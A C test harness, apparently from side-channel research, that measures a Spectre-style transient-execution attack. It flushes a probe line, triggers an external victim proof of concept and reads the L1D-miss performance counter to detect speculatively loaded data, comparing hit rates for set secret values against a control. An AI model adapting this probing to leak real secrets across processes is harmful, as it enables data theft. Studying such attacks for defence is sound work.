// stage2_manual_test.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

// 来自 victim PoC
void vf_set_secret(uint8_t s);
void vf_run_attack_once(void);
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s);

// 来自 pmu_helper.c
uint64_t pmu_read_l1d_miss(void);

static inline void flush_line(volatile uint8_t *addr) {
    _mm_clflush((void *)addr);
    _mm_mfence();
}

/**
 * 使用 L1D miss 事件对某个地址做一次 probe：
 * - 在访问前读取 L1D miss 计数器；
 * - 访问该地址；
 * - 再读取 L1D miss 计数器；
 * - 若 delta == 0，则认为 probe 访问命中 L1（之前已在 L1）；
 * - 若 delta > 0，则认为 probe 访问是 L1 miss（之前不在 L1）。
 */
static int probe_line_via_l1d_miss(volatile uint8_t *addr) {
    _mm_lfence();
    uint64_t m0 = pmu_read_l1d_miss();
    _mm_lfence();
    (void)*addr;
    _mm_lfence();
    uint64_t m1 = pmu_read_l1d_miss();
    _mm_lfence();
    uint64_t delta = m1 - m0;
    return (delta == 0);  // 1 = hit, 0 = miss
}

/**
 * 对给定 secret 值做多次试验：
 * 1) 设置 secret；
 * 2) 获取 probe 地址；
 * 3) 每次试验：
 *    - flush 该地址；
 *    - run_attack_once() 触发瞬态执行；
 *    - 用 L1D miss 做 probe，看是否命中。
 */
static void stage2_test_for_secret(uint8_t s, int trials) {
    vf_set_secret(s);
    volatile uint8_t *probe = vf_get_probe_addr_for_secret(s);

    int hits = 0;
    int hits0 = 0;
    for (int i = 0; i < trials; i++) {
        flush_line(probe);

        // 小延迟以减少 flush 和攻击间的重叠
        for (volatile int z = 0; z < 200; z++) {}

        vf_run_attack_once();  // 内部包含训练+攻击，打开 spec 窗口+执行 gadget
        //(void)*probe;

        // 再来一点点延迟，避免测量过于重叠
        for (volatile int z = 0; z < 100; z++) {}

        int is_hit = probe_line_via_l1d_miss(probe);
        hits += is_hit;
    }

    for (int i = 0; i < trials; i++) {
        flush_line(probe);
        for (volatile int z = 0; z < 200; z++) {}
        int is_hit0 = probe_line_via_l1d_miss(probe);
        hits0 += is_hit0;
    }

    printf("Stage2: secret=0x%02x, hits=%d / %d (hit rate=%.3f)\n",
           s, hits, trials, (double)hits / (double)trials);
    printf("Stage2: control=0x%02x, hits=%d / %d (hit rate=%.3f)\n",
           s, hits0, trials, (double)hits0 / (double)trials);
}

int main(void) {
    // 你也可以在 victim 里提供 vf_init() 做 array2 初始化；
    // 如果没有，这里只要保证主程序初始化过一次 victim 即可。
    // 对当前 PoC，可以在链接时不包含原 main，而在 victim .o 中保留全局变量初始化。

    int trials = 1000;
    uint8_t s0 = 0x88;
    uint8_t s1 = 0x99;

    printf("=== Stage2 L1D-miss based test ===\n");
    stage2_test_for_secret(s0, trials);
    stage2_test_for_secret(s1, trials);

    return 0;
}